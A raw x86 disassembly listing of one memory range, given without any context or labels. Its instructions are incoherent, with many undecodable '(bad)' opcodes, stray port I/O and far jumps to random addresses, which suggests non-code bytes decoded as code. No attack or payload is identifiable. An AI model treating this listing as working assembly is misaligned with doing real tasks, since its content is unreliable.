  41df92:	mov    ecx,0xfc31fb92
  41df97:	pop    edi
  41df98:	enter  0x6264,0x1
  41df9c:	add    BYTE PTR [edi],0xc5
  41df9f:	add    bl,bh
  41dfa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfa2:	cld    
  41dfa3:	add    eax,0xedf1a316
  41dfa8:	jnp    0x41df4d
  41dfaa:	mov    ebp,0xdb45b2ae
  41dfaf:	rcr    DWORD PTR [edi+0xed7ffe7],cl
  41dfb5:	jbe    0x41e014
  41dfb7:	add    esp,DWORD PTR [esi+esi*2+0x59]
  41dfbb:	jmp    0x3312e7ed
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	push   eax
  41dfc2:	test   eax,0xbaca1a94
  41dfc7:	mov    eax,0xc4cd8c4b
  41dfcc:	pop    ss
  41dfcd:	and    DWORD PTR [edi],eax
  41dfcf:	das    
  41dfd0:	jg     0x41e028
  41dfd2:	bound  esi,QWORD PTR ds:0x242ab820
  41dfd8:	add    al,0x83
  41dfda:	stos   DWORD PTR es:[edi],eax
  41dfdb:	adc    ebx,DWORD PTR ds:0x51436db9
  41dfe1:	(bad)  
  41dfe2:	scas   al,BYTE PTR es:[edi]
  41dfe3:	sahf   
  41dfe4:	(bad)  
  41dfe5:	test   DWORD PTR [ecx+0x7a801325],0x552ec18d
  41dfef:	stc    
  41dff0:	mov    esi,0xed152745
  41dff5:	cmp    DWORD PTR [esi-0x1e],esp
  41dff8:	shr    edi,0x25
  41dffb:	loopne 0x41df87
  41dffd:	retf   
  41dffe:	lods   eax,DWORD PTR ds:[esi]
  41dfff:	je     0x41e001
  41e001:	pop    ds
  41e002:	jb     0x41df8e
  41e004:	mov    al,dh
  41e006:	pop    ecx
  41e007:	or     ah,bh
  41e009:	shl    BYTE PTR [eax-0x2fe827e],1
  41e00f:	lds    eax,FWORD PTR [ebx-0x2d5545f3]
  41e015:	adc    ecx,esp
  41e017:	gs jnp 0x41dfc1
  41e01a:	fs pop edx
  41e01c:	dec    esi
  41e01d:	rcr    BYTE PTR [ebx],cl
  41e01f:	(bad)  
  41e020:	xchg   ecx,eax
  41e021:	inc    esi
  41e022:	jg     0x41e074
  41e024:	lods   eax,DWORD PTR ds:[esi]
  41e025:	or     esp,esp
  41e027:	xchg   DWORD PTR [edi],ebp
  41e029:	push   eax
  41e02a:	cdq    
  41e02b:	fld    QWORD PTR [edx]
  41e02d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e02e:	mov    eax,0xa018a707
  41e033:	xchg   DWORD PTR [ecx+esi*4+0x7],edi
  41e037:	call   0xa024:0xc1c823db
  41e03e:	and    BYTE PTR [ecx-0x3a],bl
  41e041:	out    dx,eax
  41e042:	stc    
  41e043:	or     BYTE PTR [ebx+0x533594fc],ah
  41e049:	lods   al,BYTE PTR ds:[esi]
  41e04a:	adc    al,0xaa
  41e04c:	mov    ecx,DWORD PTR [eax-0x68]
  41e04f:	into   
  41e050:	das    
  41e051:	push   ecx
  41e052:	outs   dx,BYTE PTR ds:[esi]
  41e053:	dec    ebx
  41e054:	lods   al,BYTE PTR ds:[esi]
  41e055:	pop    edx
  41e056:	and    eax,0x4d2e61e5
  41e05b:	std    
  41e05c:	sbb    bl,BYTE PTR [esi]
  41e05e:	stos   BYTE PTR es:[edi],al
  41e05f:	add    al,0xfd
  41e062:	cmc    
  41e063:	mov    ds:0xdea6cbdf,eax
  41e068:	sub    BYTE PTR [eax+0x21],0xb9
  41e06c:	retw   
  41e06e:	sbb    DWORD PTR [ebx-0x44],esi
  41e071:	lods   eax,DWORD PTR ds:[esi]
  41e072:	sahf   
  41e073:	loop   0x41e09a
  41e075:	mov    bl,0x2f
  41e077:	push   0x4e343b8d
  41e07c:	and    al,0xad
  41e07e:	and    DWORD PTR [edx-0x71f94a84],ebp
  41e084:	cs pop edx
  41e086:	mov    al,0x60
  41e088:	cdq    
  41e089:	adc    eax,0xa37bb908
  41e08e:	jns    0x41e051
  41e090:	es retf 0xea76
  41e094:	and    DWORD PTR [esi-0x6d],ecx
  41e097:	xchg   DWORD PTR [edi-0x47],ecx
  41e09a:	dec    ecx
  41e09b:	push   ebp
  41e09c:	sub    BYTE PTR [esi],ah
  41e09e:	arpl   WORD PTR [eax],sp
  41e0a0:	inc    ecx
  41e0a1:	mov    ebp,0xd7f82238
  41e0a6:	jae    0x41e081
  41e0a8:	mov    esi,0x5bdf5929
  41e0ad:	xor    bl,BYTE PTR [esi+0x18]
  41e0b0:	mov    DWORD PTR [ebp-0x2b04e229],esp
  41e0b6:	cmp    BYTE PTR [esi-0x214ba0],al
  41e0bc:	adc    ecx,edx
  41e0be:	add    edx,DWORD PTR [ecx-0x28f70d67]
  41e0c4:	test   al,0x73
  41e0c6:	push   es
  41e0c7:	sbb    esi,esi
  41e0c9:	pop    es
  41e0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0cb:	pushf  
  41e0cc:	pusha  
  41e0cd:	jp     0x41e08a
  41e0cf:	je     0x41e127
  41e0d1:	dec    ebx
  41e0d2:	mov    ebp,0x3be3652e
  41e0d7:	sbb    BYTE PTR [esi-0x15],bl
  41e0da:	pop    ecx
  41e0db:	(bad)  
  41e0dc:	fs push ecx
  41e0de:	cwde   
  41e0df:	sub    eax,0x1915a330
  41e0e4:	inc    esp
  41e0e5:	mov    edi,0x11f079cf
  41e0ea:	or     ah,BYTE PTR [edx+0x1f320453]
  41e0f0:	or     bh,bh
  41e0f2:	jnp    0x41e11f
  41e0f4:	cdq    
  41e0f5:	or     al,0xfb
  41e0f7:	popa   
  41e0f8:	stc    
  41e0f9:	popf   
  41e0fa:	fsub   DWORD PTR [esp+ebx*8+0x62]
  41e0fe:	push   ebp
  41e0ff:	xor    eax,DWORD PTR [esi-0x5c]
  41e102:	mov    ecx,0xe9b3ed6b
  41e107:	fcom   QWORD PTR [ecx-0x16c1d4cc]
  41e10d:	mov    esp,0x140df16e
  41e112:	addr16 jb 0x41e106
  41e115:	inc    ecx
  41e116:	aam    0x8a
  41e118:	test   eax,0xe25b1b67
  41e11d:	inc    esi
  41e11e:	inc    ebp
  41e11f:	js     0x41e0b1
  41e121:	sbb    BYTE PTR [edx-0x63],al
  41e124:	cmp    ebx,ebx
  41e126:	add    eax,0xf56e5d27
  41e12b:	sahf   
  41e12c:	in     al,0x5a
  41e12e:	jne    0x41e15f
  41e130:	jecxz  0x41e169
  41e132:	mov    ecx,0x5bad0592
  41e137:	mov    edi,DWORD PTR [ebx+0x2e0d58d7]
  41e13d:	mov    dh,dl
  41e13f:	push   0x77a84de7
  41e144:	outs   dx,BYTE PTR ds:[esi]
  41e145:	dec    esi
  41e146:	inc    esi
  41e147:	jne    0x41e191
  41e149:	xchg   ecx,eax
  41e14a:	mov    al,0xde
  41e14c:	daa    
  41e14d:	lds    edi,FWORD PTR [edi]
  41e14f:	fidivr WORD PTR [edx]
  41e151:	push   esi
  41e152:	cdq    
  41e153:	popw   ss
  41e155:	adc    dl,BYTE PTR [edi]
  41e157:	shl    BYTE PTR [eax+0x56],cl
  41e15a:	mov    esp,0xe3ba89fa
  41e15f:	call   0x9cc9edcf
  41e164:	jmp    0x78a1c257
  41e169:	cmp    BYTE PTR [eax-0x6f],dl
  41e16c:	inc    edx
  41e16d:	in     eax,0xef
  41e16f:	jbe    0x41e1aa
  41e171:	pop    esi
  41e172:	pushf  
  41e173:	out    0xea,eax
  41e175:	in     eax,0x84
  41e177:	dec    ebp
  41e178:	nop
  41e179:	push   0x2d4afa1
  41e17e:	pop    eax
  41e17f:	mov    al,0x89
  41e181:	imul   eax,DWORD PTR [esi-0xf],0xb85252ee
  41e188:	call   0xbef2:0xf6e14d45
  41e18f:	(bad)  [edx+0x793bf68b]
  41e195:	iret   
  41e196:	clc    
  41e197:	mov    eax,0x1e2ec677
  41e19c:	into   
  41e19d:	ret    0x880a
  41e1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1a1:	out    dx,al
  41e1a2:	arpl   WORD PTR [ebx+0x63],cx
  41e1a5:	xchg   ecx,eax
  41e1a6:	retf   0x253f
  41e1a9:	lds    ecx,FWORD PTR [ebx-0x16]
  41e1ac:	test   eax,0xa86d0f2d
  41e1b1:	out    0x2a,eax
  41e1b3:	fild   WORD PTR [eax+edi*1+0x56]
  41e1b7:	outs   dx,DWORD PTR ds:[esi]
  41e1b8:	inc    esi
  41e1b9:	mov    ch,0x35
  41e1bb:	je     0x41e15f
  41e1bd:	daa    
  41e1be:	inc    esp
  41e1bf:	xor    eax,0x5b570bc
  41e1c4:	das    
  41e1c5:	add    BYTE PTR [ecx-0x2b1bb1a3],al
  41e1cb:	xchg   ecx,eax
  41e1cc:	jb     0x41e1a7
  41e1ce:	lock mov al,0x5e
  41e1d1:	add    edx,ebp
  41e1d3:	aas    
  41e1d4:	sbb    eax,0x918152af
  41e1d9:	or     al,0x6f
  41e1db:	xchg   edx,eax
  41e1dc:	fcomp  st(0)
  41e1de:	rcr    BYTE PTR [esi+0xe],cl
  41e1e1:	jmp    0x41e1b1
  41e1e3:	push   ebx
  41e1e4:	dec    edi
  41e1e5:	sbb    cl,BYTE PTR [ebx+0x64ea3414]
  41e1eb:	les    edi,FWORD PTR [ebp+0x423659d7]
  41e1f1:	mov    ebp,0x2ab04f78
  41e1f6:	mov    dh,0xb2
  41e1f8:	int3   
  41e1f9:	xor    esi,DWORD PTR [ecx]
  41e1fb:	dec    esi
  41e1fc:	mov    BYTE PTR [ebp-0x718ec5b1],ch
  41e202:	enter  0xc6a4,0x20
  41e206:	cli    
  41e207:	and    BYTE PTR [ebx-0x40736ccd],bh
  41e20d:	push   0x70ea6a4c
  41e212:	adc    BYTE PTR [edi-0xadd2241],ch
  41e218:	stc    
  41e219:	adc    dl,BYTE PTR [edx+esi*8]
  41e21c:	repz jp 0x41e235
  41e21f:	(bad)  
  41e220:	cmp    BYTE PTR [ecx],ah
  41e222:	and    ah,ah
  41e224:	cmp    al,0xa6
  41e226:	mov    bl,0xed
  41e228:	(bad)  
  41e229:	popf   
  41e22a:	cmp    ah,0x63
  41e22d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e22e:	daa    
  41e22f:	and    cl,BYTE PTR [eax-0x19]
  41e232:	pop    ecx
  41e233:	mov    esp,0x7c709d00
  41e238:	add    BYTE PTR [ebp+0x728b3e6f],bh
  41e23e:	cli    
  41e23f:	dec    edi
  41e240:	loope  0x41e2b1
  41e242:	in     eax,0xf6
  41e244:	cmc    
  41e245:	rcl    DWORD PTR [esp+eiz*8-0x60],0xdc
  41e24a:	dec    ebx
  41e24b:	sar    BYTE PTR [ecx],0x92
  41e24e:	fnsave [edi+edx*1-0x74b66fb]
  41e255:	jmp    0xac5c000
  41e25a:	jnp    0x41e22c
  41e25c:	sub    DWORD PTR [eax],0xc9410d7
  41e262:	sub    esi,edi
  41e264:	sbb    BYTE PTR [edi+0x67],ch
  41e267:	fsub   QWORD PTR [eax]
  41e269:	fld    QWORD PTR [ecx+0x1f2e27f6]
  41e26f:	mov    ebx,0x8c893123
  41e274:	inc    esi
  41e275:	xchg   edi,eax
  41e276:	sar    BYTE PTR [ebx+ebp*8-0x2e],0x3
  41e27b:	push   0xcb14a1d4
  41e280:	enter  0xd08f,0xca
  41e284:	inc    ecx
  41e285:	and    dl,BYTE PTR [eax-0x65239d]
  41e28b:	push   edx
  41e28c:	pop    ss
  41e28d:	add    BYTE PTR [esi-0x2],bl
  41e290:	div    BYTE PTR [edi-0x3db29716]
  41e296:	(bad)  
  41e297:	loope  0x41e2d8
  41e299:	lahf   
  41e29a:	xor    eax,0xac59669f
  41e29f:	jo     0x41e2e0
  41e2a1:	retf   
  41e2a2:	neg    DWORD PTR [eax+0x73]
  41e2a5:	in     eax,dx
  41e2a6:	test   DWORD PTR [edx+0x1420893c],edx
  41e2ac:	dec    edx
  41e2ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2ae:	cdq    
  41e2af:	mov    bl,0x51
  41e2b1:	jl     0x41e308
  41e2b3:	das    
  41e2b4:	dec    edx
  41e2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2b6:	aas    
  41e2b7:	jecxz  0x41e311
  41e2b9:	xor    al,ah
  41e2bb:	xor    al,0xa0
  41e2bd:	gs ins BYTE PTR es:[edi],dx
  41e2bf:	stos   BYTE PTR es:[edi],al
  41e2c0:	inc    ebp
  41e2c1:	xor    cl,cl
  41e2c3:	enter  0x64a,0x23
  41e2c7:	daa    
  41e2c8:	pushf  
  41e2c9:	out    0x30,eax
  41e2cb:	or     ebp,DWORD PTR [edx-0x347a1d71]
  41e2d1:	and    al,0x9a
  41e2d4:	call   0x8368:0xfa5f8c5d
  41e2db:	jmp    0xd6cb:0x99b152e9
  41e2e2:	sub    al,0xae
  41e2e4:	aad    0xd9
  41e2e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2e7:	dec    esi
  41e2e8:	push   ebx
  41e2e9:	repz loope 0x41e356
  41e2ec:	xlat   BYTE PTR ds:[ebx]
  41e2ed:	cmp    eax,0x9f326664
  41e2f2:	cli    
  41e2f3:	outs   dx,BYTE PTR ds:[esi]
  41e2f4:	cmp    eax,0xfa31ba60
  41e2f9:	cmp    BYTE PTR [esi],dl
  41e2fb:	je     0x41e36c
  41e2fd:	lods   eax,DWORD PTR ds:[esi]
  41e2fe:	out    0x86,al
  41e300:	test   al,0x77
  41e302:	in     al,dx
  41e303:	call   0x1c594631
  41e308:	jmp    0x41e37c
  41e30a:	test   DWORD PTR [ebp-0x24],eax
  41e30d:	mov    ecx,0x65def1b4
  41e312:	add    ebx,DWORD PTR [edx-0x27]
  41e315:	std    
  41e316:	int3   
  41e317:	test   al,0x50
  41e319:	and    ch,BYTE PTR [ebx]
  41e31b:	adc    edi,DWORD PTR [ebx]
  41e31d:	aam    0x24
  41e31f:	ds ss jg 0x41e2e3
  41e323:	aam    0x48
  41e325:	push   0xffffff93
  41e327:	and    ah,0x57
  41e32a:	cmp    esi,esp
  41e32c:	sub    ch,BYTE PTR [esi-0x61c778ea]
  41e332:	test   al,0x9c
  41e334:	mov    DWORD PTR [ecx+0x4de41cad],eax
  41e33a:	sahf   
  41e33b:	or     dl,al
  41e33d:	aaa    
  41e33e:	arpl   WORD PTR [esi-0x62368422],sp
  41e344:	sti    
  41e345:	(bad)  
  41e346:	cwde   
  41e347:	test   al,0x96
  41e349:	outs   dx,DWORD PTR ds:[esi]
  41e34a:	and    ax,0x8308
  41e34e:	clc    
  41e34f:	cwde   
  41e350:	cld    
  41e351:	(bad)  
  41e352:	retf   
  41e353:	lahf   
  41e354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e355:	dec    esi
  41e356:	repz jns 0x41e38a
  41e359:	ss aaa 
  41e35b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e35c:	or     eax,0x50f26fda
  41e361:	retf   0xa7bb
  41e364:	jmp    0x41e3ad
  41e366:	jne    0x41e3a5
  41e368:	mov    WORD PTR [edi-0x74],ss
  41e36b:	xchg   di,ax
  41e36d:	mov    ds:0x6ad2af76,eax
  41e372:	into   
  41e373:	jno    0x6148f850
  41e379:	mov    bl,0x3c
  41e37b:	aaa    
  41e37c:	or     BYTE PTR [eax],bl
  41e37e:	fisttp DWORD PTR [ecx-0x24]
  41e381:	imul   ebx,DWORD PTR [ecx-0x41a15f51],0x4d
  41e388:	retf   0x752b
  41e38b:	ret    
  41e38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38d:	push   eax
  41e38e:	call   0x438c:0xba28517c
  41e395:	push   es
  41e396:	sub    al,bl
  41e398:	fadd   DWORD PTR [edi+0x4ec2baa]
  41e39e:	pop    edx
  41e39f:	adc    eax,DWORD PTR [edx]
  41e3a1:	push   edi
  41e3a2:	lock push cs
  41e3a4:	popa   
  41e3a5:	xchg   edi,eax
  41e3a6:	or     ecx,DWORD PTR [ecx-0x401bc4d1]
  41e3ac:	pop    es
  41e3ad:	ret    0x3f68
  41e3b0:	mov    cl,0xf5
  41e3b2:	mov    al,0x96
  41e3b4:	sahf   
  41e3b5:	aaa    
  41e3b6:	ins    BYTE PTR es:[edi],dx
  41e3b7:	pop    es
  41e3b8:	aaa    
  41e3b9:	jb     0x41e35e
  41e3bb:	into   
  41e3bc:	das    
  41e3bd:	and    dh,BYTE PTR [esi]
  41e3bf:	cwde   
  41e3c0:	xchg   dl,al
  41e3c2:	fwait
  41e3c3:	(bad)  
  41e3c4:	mov    bh,0xa2
  41e3c6:	and    bh,BYTE PTR [edx+eax*1+0x5d1ee661]
  41e3cd:	mov    eax,0x7d7f073c
  41e3d2:	fdivr  DWORD PTR [esp+ecx*8]
  41e3d5:	fild   DWORD PTR [esi+0x52]
  41e3d8:	adc    BYTE PTR [eax+0x44c5dbf1],ah
  41e3de:	mov    DWORD PTR [ebp+0x59],edx
  41e3e1:	call   0x62a6b1de
  41e3e6:	mov    bh,0x9a
  41e3e8:	push   ebp
  41e3e9:	outs   dx,BYTE PTR ds:[esi]
  41e3ea:	stos   DWORD PTR es:[edi],eax
  41e3eb:	enter  0x1d23,0x87
  41e3ef:	retf   0x787b
  41e3f2:	pop    ebp
  41e3f3:	call   0xf5a046a9
  41e3f8:	push   ebx
  41e3f9:	xchg   esp,eax
  41e3fa:	addr16 pop ecx
  41e3fc:	cmp    al,0x6
  41e3fe:	sub    edx,ebx
  41e400:	int3   
  41e401:	(bad)  
  41e402:	push   esp
  41e403:	mov    edx,0xa35b2fe7
  41e408:	jle    0x41e435
  41e40a:	xor    BYTE PTR [edx],bl
  41e40c:	dec    edi
  41e40d:	jae    0x41e461
  41e40f:	or     bl,BYTE PTR [ebp-0x6a28414]
  41e415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e416:	fcom   DWORD PTR [edi-0x10]
  41e419:	inc    eax
  41e41a:	ret    0x3a63
  41e41d:	ret    
  41e41e:	cs xchg edi,eax
  41e420:	retf   
  41e421:	inc    esp
  41e422:	loop   0x41e3fd
  41e424:	cwde   
  41e425:	push   0x1d
  41e427:	add    eax,0x155a6327
  41e42c:	sub    bl,BYTE PTR [edx+0x4a]
  41e42f:	ds push 0x19
  41e432:	push   ss
  41e433:	mov    dl,0x14
  41e435:	ss add eax,0xdc163189
  41e43b:	std    
  41e43c:	loop   0x41e3e3
  41e43e:	daa    
  41e43f:	data16 fwait
  41e441:	sbb    cl,cl
  41e443:	in     eax,dx
  41e444:	push   ecx
  41e445:	sub    DWORD PTR [esi],esi
  41e447:	ds enter 0xe31d,0x32
  41e44c:	sub    DWORD PTR [edx-0x6],esp
  41e44f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e450:	xchg   edx,eax
  41e451:	ds cld 
  41e453:	scas   al,BYTE PTR es:[edi]
  41e454:	sar    bl,cl
  41e456:	add    ch,BYTE PTR [edx-0x2db0022b]
  41e45c:	nop
  41e45d:	mov    ebp,0xb69db475
  41e462:	jmp    0x4d5809d1
  41e467:	and    bh,bl
  41e469:	sahf   
  41e46a:	push   edx
  41e46b:	call   0x86ff974c
  41e470:	int    0x2a
  41e472:	jnp    0x41e40d
  41e474:	push   ebx
  41e475:	mov    esp,0x6e98bfb6
  41e47a:	into   
  41e47b:	lock mov ds:0xed73b654,eax
  41e481:	dec    eax
  41e482:	xchg   ecx,eax
  41e483:	xchg   ecx,eax
  41e484:	ins    BYTE PTR es:[edi],dx
  41e485:	xor    al,0x86
  41e487:	scas   al,BYTE PTR es:[edi]
  41e488:	pop    esi
  41e489:	mov    ebx,0x2f00bdd9
  41e48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e48f:	push   es
  41e490:	xchg   esp,eax
  41e491:	sub    ecx,0x16
  41e494:	fldcw  WORD PTR [ebx+0x5c29b128]
  41e49a:	mov    esp,0x139d6759
  41e49f:	xlat   BYTE PTR ds:[ebx]
  41e4a0:	fdiv   QWORD PTR [ecx-0x65c2d8a5]
  41e4a6:	out    0xf8,al
  41e4a8:	pop    esi
  41e4a9:	cmp    eax,0x9ef31f27
  41e4ae:	out    dx,al
  41e4af:	int    0x7
  41e4b1:	jnp    0x41e456
  41e4b3:	adc    al,0x94
  41e4b5:	in     eax,dx
  41e4b6:	arpl   WORD PTR [edx+0x229fb458],bx
  41e4bc:	adc    esi,DWORD PTR [ecx+0x695e05cc]
  41e4c2:	les    ebp,FWORD PTR [edi+eiz*8-0x21]
  41e4c6:	imul   edi,DWORD PTR [esi-0x18f11669],0x63
  41e4cd:	sub    al,0xa8
  41e4cf:	cmp    dh,cl
  41e4d1:	xchg   edi,eax
  41e4d2:	(bad)  
  41e4d3:	sub    ebp,DWORD PTR [edx+ebp*1]
  41e4d6:	dec    ebp
  41e4d7:	jmp    0xc5e335dc
  41e4dc:	jle    0x41e4ce
  41e4de:	jo     0x41e48d
  41e4e0:	mov    bh,0xd2
  41e4e2:	dec    edx
  41e4e3:	(bad)  
  41e4e4:	pop    ecx
  41e4e5:	add    DWORD PTR ds:0x634bd4a2,edx
  41e4eb:	fs push 0x6a2fdbe1
  41e4f1:	xchg   esi,eax
  41e4f2:	sub    BYTE PTR [ecx-0x47],bl
  41e4f5:	and    eax,0x8b58fdd9
  41e4fa:	cmp    esi,DWORD PTR [esi+eiz*8+0x2204586f]
  41e501:	sub    al,0xc
  41e503:	sub    eax,0xc13972d
  41e508:	out    dx,al
  41e509:	pop    esp
  41e50a:	(bad)  
  41e50c:	cdq    
  41e50d:	add    edx,DWORD PTR [ecx-0x26]
  41e510:	call   0x32692640
  41e515:	in     al,dx
  41e516:	test   BYTE PTR [edx-0x31],bl
  41e519:	test   DWORD PTR [edi-0x5f],esi
  41e51c:	fldcw  WORD PTR [edi+0x666994d2]
  41e522:	pop    ebx
  41e523:	pop    esi
  41e524:	iret   
  41e525:	sahf   
  41e526:	(bad)  
  41e527:	call   0x59835260
  41e52c:	xor    dl,BYTE PTR [ebp+0x3b]
  41e52f:	and    bp,si
  41e532:	add    al,0x6b
  41e534:	in     al,dx
  41e535:	lods   al,BYTE PTR ds:[esi]
  41e536:	add    eax,DWORD PTR [edi-0x1b5cf03d]
  41e53c:	mov    al,ah
  41e53e:	fdivr  QWORD PTR [edx+ebx*2+0x54a9d1b1]
  41e545:	std    
  41e546:	(bad)  
  41e548:	dec    ecx
  41e549:	or     DWORD PTR [ecx],esi
  41e54b:	mov    ch,0xa8
  41e54d:	pop    edi
  41e54e:	jmp    0xb78a30b3
  41e553:	jmp    0x6d21f249
  41e558:	mov    cs,WORD PTR [ebx+0x52]
  41e55b:	dec    esp
  41e55c:	jge    0x41e5c4
  41e55e:	jecxz  0x41e4fc
  41e560:	jecxz  0x41e5c4
  41e562:	ror    esi,cl
  41e564:	in     al,dx
  41e565:	stos   BYTE PTR es:[edi],al
  41e566:	sub    ebx,DWORD PTR [ebp+0x2c3b8c88]
  41e56c:	cmc    
  41e56d:	in     al,dx
  41e56e:	popa   
  41e56f:	xchg   esp,eax
  41e570:	push   edi
  41e571:	leave  
  41e572:	or     DWORD PTR es:[ebx],0x9
  41e576:	rol    BYTE PTR [ecx+eiz*4],0x17
  41e57a:	retf   
  41e57b:	add    cl,BYTE PTR [ecx]
  41e57d:	les    edx,FWORD PTR [ebx+0x7d]
  41e580:	clc    
  41e581:	dec    ebp
  41e582:	mov    edx,0x7575a6b6
  41e587:	adc    ebx,edx
  41e589:	imul   esi,DWORD PTR [ecx+ecx*2+0x61],0xffffffec
  41e58e:	push   0x4d5cca11
  41e593:	or     DWORD PTR [edx+0x7a84ccfb],edi
  41e599:	call   0x4613:0x7b678754
  41e5a0:	loopne 0x41e583
  41e5a2:	fst    st(0)
  41e5a4:	je     0x41e56c
  41e5a6:	es aad 0x31
  41e5a9:	retf   0x39c5
  41e5ac:	ds leave 
  41e5ae:	mov    ch,0xd
  41e5b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5b1:	or     BYTE PTR [esi],ah
  41e5b3:	ds push esp
  41e5b5:	lods   eax,DWORD PTR ds:[esi]
  41e5b6:	aaa    
  41e5b7:	dec    esi
  41e5b8:	scas   eax,DWORD PTR es:[edi]
  41e5b9:	xchg   si,ax
  41e5bb:	repz imul ecx,DWORD PTR [ebp+ebx*2-0x2e],0xffffff93
  41e5c1:	inc    edx
  41e5c2:	jge    0x41e5a4
  41e5c4:	sub    al,0xbc
  41e5c6:	shl    DWORD PTR [ecx+0x37a660d3],0x3
  41e5cd:	and    ebp,DWORD PTR [ebx+ecx*1+0x51]
  41e5d1:	cli    
  41e5d2:	ret    
  41e5d3:	out    dx,al
  41e5d4:	repnz cmc 
  41e5d6:	sahf   
  41e5d7:	xchg   ebp,eax
  41e5d8:	sbb    eax,0xf490b0e1
  41e5dd:	out    dx,eax
  41e5de:	push   es
  41e5df:	repz loopne 0x41e59d
  41e5e2:	sub    edx,esp
  41e5e4:	test   DWORD PTR [ebx+0x7a1259de],esp
  41e5ea:	push   0x1b36989c
  41e5ef:	dec    esi
  41e5f0:	lea    ebx,gs:[esi+ecx*1]
  41e5f4:	sub    eax,0xfb02f752
  41e5f9:	scas   al,BYTE PTR es:[edi]
  41e5fa:	push   0xffffff88
  41e5fc:	sbb    BYTE PTR [ebp+esi*1+0x16],dh
  41e600:	ret    0x88d0
  41e603:	cdq    
  41e604:	popa   
  41e605:	and    al,0x54
  41e607:	sub    eax,0xd22e01c1
  41e60c:	mov    dl,BYTE PTR [ebp+0x7d]
  41e60f:	jl     0x41e5f1
  41e611:	ja     0x41e62a
  41e613:	adc    cl,BYTE PTR fs:[esi+esi*1+0xb]
  41e618:	in     eax,0x92
  41e61a:	mov    ds:0xf2019eec,al
  41e61f:	mov    cl,0xd2
  41e621:	and    ch,bh
  41e623:	scas   eax,DWORD PTR es:[edi]
  41e624:	push   es
  41e625:	ficom  DWORD PTR [ebp-0x3fa5c94b]
  41e62b:	sbb    al,0x1c
  41e62d:	sub    bl,BYTE PTR [ecx]
  41e62f:	inc    esi
  41e630:	pop    eax
  41e631:	dec    edi
  41e632:	lds    ebx,FWORD PTR [edx-0x75b8648d]
  41e638:	xchg   edx,eax
  41e639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e63a:	mov    esi,0xd0ff94c9
  41e63f:	sbb    DWORD PTR [ecx],edx
  41e641:	xor    eax,0x88dd8a42
  41e646:	jmp    0xbafcaebd
  41e64b:	test   DWORD PTR [ecx-0x1cb9be2a],ebx
  41e651:	daa    
  41e652:	(bad)  
  41e653:	cmp    al,BYTE PTR [esi+0x2bb38dc6]
  41e659:	ror    BYTE PTR [esi+0xdfa30bf],0x69
  41e660:	leave  
  41e661:	loope  0x41e6c2
  41e663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e664:	and    dl,BYTE PTR [edx-0xabfaf21]
  41e66a:	or     ch,BYTE PTR [edx-0x4e8b3f2f]
  41e670:	cmp    al,0x57
  41e672:	adc    dl,dl
  41e674:	xor    BYTE PTR [ebx+0x14],dl
  41e677:	push   ecx
  41e678:	jmp    0xf1a0:0xc4c2ead0
  41e67f:	push   es
  41e680:	mov    eax,0x287115fe
  41e685:	cld    
  41e686:	ret    0x56db
  41e689:	or     eax,0xacbe3171
  41e68e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e68f:	dec    edi
  41e690:	fiadd  DWORD PTR [ebp+0x7ee0c809]
  41e696:	aam    0x95
  41e698:	mov    bh,0xb0
  41e69a:	scas   eax,DWORD PTR es:[edi]
  41e69b:	ror    BYTE PTR [edx+0x2e80cfc6],1
  41e6a1:	mov    esp,0xf9d09555
  41e6a6:	sub    DWORD PTR [ebx],edi
  41e6a8:	mov    dh,0x53
  41e6aa:	jae    0x41e63f
  41e6ac:	scas   eax,DWORD PTR es:[edi]
  41e6ad:	jmp    0xb3a9f5f8
  41e6b2:	pop    ebp
  41e6b3:	aam    0x1b
  41e6b5:	hlt    
  41e6b6:	sub    DWORD PTR [ebx-0x15],esp
  41e6b9:	sub    ebp,eax
  41e6bb:	mov    bh,0x13
  41e6bd:	mov    dl,0xd0
  41e6bf:	jne    0x41e719
  41e6c1:	adc    esp,DWORD PTR [edi-0x2d2d6003]
  41e6c7:	shl    DWORD PTR [edi],cl
  41e6c9:	mov    ch,0x39
  41e6cb:	xlat   BYTE PTR es:[ebx]
  41e6cd:	xchg   esp,eax
  41e6ce:	xchg   esi,eax
  41e6cf:	fwait
  41e6d0:	mov    bh,0x38
  41e6d2:	mov    ch,0xc
  41e6d4:	aaa    
  41e6d5:	and    eax,DWORD PTR [ebx]
  41e6d7:	push   eax
  41e6d8:	and    BYTE PTR [ebp-0x32],cl
  41e6db:	sbb    BYTE PTR [ebx-0x7707378b],dl
  41e6e1:	dec    edi
  41e6e2:	popa   
  41e6e3:	push   esi
  41e6e4:	add    DWORD PTR [esi+0x37],0x4e
  41e6e8:	dec    edi
  41e6e9:	test   al,0xf
  41e6eb:	inc    ecx
  41e6ec:	lahf   
  41e6ed:	mov    dh,0xf2
  41e6ef:	add    ecx,esp
  41e6f1:	mov    ebp,0x316110a1
  41e6f6:	sub    eax,0x3acb9bea
  41e6fb:	cli    
  41e6fc:	ja     0x41e6dc
  41e6fe:	or     cl,BYTE PTR [edi]
  41e700:	std    
  41e701:	call   0xcae112a8
  41e706:	icebp  
  41e707:	adc    eax,0x1b04f105
  41e70c:	sub    dh,BYTE PTR [ecx]
  41e70e:	mov    cl,0x3e
  41e710:	hlt    
  41e711:	sbb    eax,0x45a2b669
  41e716:	add    eax,0x6adf63c6
  41e71b:	and    dl,BYTE PTR [eax]
